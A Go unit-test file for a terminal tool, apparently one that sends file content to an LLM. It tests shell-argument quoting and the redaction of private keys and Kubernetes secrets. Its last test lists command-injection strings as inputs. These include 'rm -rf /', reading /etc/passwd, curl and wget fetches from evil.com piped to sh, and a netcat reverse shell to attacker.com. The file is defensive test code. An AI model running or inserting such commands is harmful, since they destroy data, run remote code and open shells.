package tui

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple path",
			input:    "/path/to/file",
			expected: "'/path/to/file'",
		},
		{
			name:     "path with spaces",
			input:    "/path/with spaces/file",
			expected: "'/path/with spaces/file'",
		},
		{
			name:     "path with single quote",
			input:    "/path/with'quote/file",
			expected: "'/path/with'\\''quote/file'",
		},
		{
			name:     "path with multiple single quotes",
			input:    "/path/'with'/'multiple'/quotes",
			expected: "'/path/'\\''with'\\''/'\\''multiple'\\''/quotes'",
		},
		{
			name:     "path with double quote",
			input:    `/path/with"doublequote/file`,
			expected: `'/path/with"doublequote/file'`,
		},
		{
			name:     "path with dollar sign",
			input:    "/path/with$(command)/file",
			expected: "'/path/with$(command)/file'",
		},
		{
			name:     "path with backtick",
			input:    "/path/with`backtick`/file",
			expected: "'/path/with`backtick`/file'",
		},
		{
			name:     "path with semicolon",
			input:    "/path/with;semicolon/file",
			expected: "'/path/with;semicolon/file'",
		},
		{
			name:     "path with ampersand",
			input:    "/path/with&ampersand/file",
			expected: "'/path/with&ampersand/file'",
		},
		{
			name:     "path with pipe",
			input:    "/path/with|pipe/file",
			expected: "'/path/with|pipe/file'",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "''",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := shellEscape(tt.input)
			if result != tt.expected {
				t.Errorf("shellEscape(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestRedactPrivateKeys_RSAKey(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if result != "[REDACTED: private key content not sent to LLM]" {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactPrivateKeys_ECKey(t *testing.T) {
	input := "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEI...\n-----END EC PRIVATE KEY-----"
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if result != "[REDACTED: private key content not sent to LLM]" {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactPrivateKeys_GenericKey(t *testing.T) {
	input := "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg...\n-----END PRIVATE KEY-----"
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if result != "[REDACTED: private key content not sent to LLM]" {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactPrivateKeys_NoKey(t *testing.T) {
	input := "just some normal file content\nwith multiple lines"
	result, redacted := redactSensitiveKeys(input)
	if redacted {
		t.Fatal("expected no redaction")
	}
	if result != input {
		t.Errorf("content should be unchanged")
	}
}

func TestRedactPrivateKeys_MixedContent(t *testing.T) {
	input := "# Config file\nssl_key: |\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\nssl_port: 443"
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if !strings.Contains(result, "ssl_port: 443") {
		t.Error("non-key content should be preserved")
	}
	if strings.Contains(result, "MIIEpAIBAAKCAQEA") {
		t.Error("key content should be removed")
	}
}

func TestRedactPrivateKeys_MultipleKeys(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\nkey1\n-----END RSA PRIVATE KEY-----\nsome text\n-----BEGIN EC PRIVATE KEY-----\nkey2\n-----END EC PRIVATE KEY-----"
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if strings.Contains(result, "key1") || strings.Contains(result, "key2") {
		t.Error("both keys should be redacted")
	}
	if !strings.Contains(result, "some text") {
		t.Error("text between keys should be preserved")
	}
}

func TestRedactPrivateKeys_CRLF(t *testing.T) {
	input := "-----BEGIN RSA PRIVATE KEY-----\r\nMIIEowIBAAKCAQEA...\r\n-----END RSA PRIVATE KEY-----"
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected redaction")
	}
	if !strings.Contains(result, "[REDACTED: private key content not sent to LLM]") {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactSensitiveKeys_Base64PEM(t *testing.T) {
	pem := "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
	encoded := base64.StdEncoding.EncodeToString([]byte(pem))
	result, redacted := redactSensitiveKeys(encoded)
	if !redacted {
		t.Fatal("expected base64 PEM key to be redacted")
	}
	if strings.Contains(result, "LS0tLS1CRUdJTi") {
		t.Error("base64 PEM content should be replaced")
	}
}

func TestRedactSensitiveKeys_Base64ECPEM(t *testing.T) {
	pem := "-----BEGIN EC PRIVATE KEY-----\nMHQCAQEEI...\n-----END EC PRIVATE KEY-----"
	encoded := base64.StdEncoding.EncodeToString([]byte(pem))
	result, redacted := redactSensitiveKeys(encoded)
	if !redacted {
		t.Fatal("expected base64 EC PEM key to be redacted")
	}
	if strings.Contains(result, "LS0tLS1CRUdJTi") {
		t.Error("base64 EC PEM content should be replaced")
	}
}

func TestRedactSensitiveKeys_K8sYAMLSecret(t *testing.T) {
	input := "  tls.key: " + strings.Repeat("ABCDEFGHIJKLMNOP", 5)
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected K8s tls.key field to be redacted")
	}
	if !strings.Contains(result, "[REDACTED: secret key data not sent to LLM]") {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactSensitiveKeys_K8sJSONSecret(t *testing.T) {
	input := `"private_key": "` + strings.Repeat("ABCDEFGHIJKLMNOP", 5) + `"`
	result, redacted := redactSensitiveKeys(input)
	if !redacted {
		t.Fatal("expected K8s private_key field to be redacted")
	}
	if !strings.Contains(result, "[REDACTED: secret key data not sent to LLM]") {
		t.Errorf("unexpected result: %s", result)
	}
}

func TestRedactSensitiveKeys_RegularBase64NotRedacted(t *testing.T) {
	// Base64 that decodes to regular text, not a private key
	input := base64.StdEncoding.EncodeToString([]byte("just some regular content"))
	result, redacted := redactSensitiveKeys(input)
	if redacted {
		t.Fatal("regular base64 should not be redacted")
	}
	if result != input {
		t.Error("content should be unchanged")
	}
}

func TestRedactSensitiveKeys_NoKeys(t *testing.T) {
	input := "just some normal file content\nwith multiple lines"
	result, redacted := redactSensitiveKeys(input)
	if redacted {
		t.Fatal("expected no redaction")
	}
	if result != input {
		t.Error("content should be unchanged")
	}
}

func TestRedactPrivateKeys_CertificateNotRedacted(t *testing.T) {
	input := "-----BEGIN CERTIFICATE-----\nMIIDXTCCAkWgAwIBAgIJ...\n-----END CERTIFICATE-----"
	result, redacted := redactSensitiveKeys(input)
	if redacted {
		t.Fatal("certificates should not be redacted")
	}
	if result != input {
		t.Errorf("certificate content should be unchanged")
	}
}

// TestShellEscapeInjectionPrevention tests that shellEscape prevents command injection
func TestShellEscapeInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"'; rm -rf /; echo '",
		"' && cat /etc/passwd && echo '",
		"'; curl http://evil.com/malware.sh | sh; echo '",
		"' || wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh || '",
		"'; nc -e /bin/sh attacker.com 4444; echo '",
	}

	for _, input := range maliciousInputs {
		result := shellEscape(input)
		// The escaped result should still be wrapped in single quotes
		// and should not contain unescaped single quotes that would break out
		if result[0] != '\'' || result[len(result)-1] != '\'' {
			t.Errorf("shellEscape did not wrap input in quotes: %q", result)
		}

		// Verify that the escaped string doesn't contain standalone single quotes
		// that would break out of the quoting context
		// (Note: '\'' sequences are safe as they properly escape the quote)
		// We're checking that we don't have a single quote without the escape sequence
		for i := 0; i < len(result); i++ {
			if result[i] == '\'' {
				// This is okay if it's at the start or end
				if i == 0 || i == len(result)-1 {
					continue
				}
				// This is okay if it's part of the '\'' escape sequence
				if i >= 1 && result[i-1] == '\\' {
					continue
				}
				// This is okay if it starts the '\'' sequence
				if i+2 < len(result) && result[i+1] == '\\' && result[i+2] == '\'' {
					continue
				}
				// This is okay if it ends the '\'' sequence
				if i >= 2 && result[i-2] == '\\' && result[i-1] == '\'' {
					continue
				}
				t.Errorf("Found unescaped single quote in result at position %d: %q", i, result)
			}
		}
	}
}
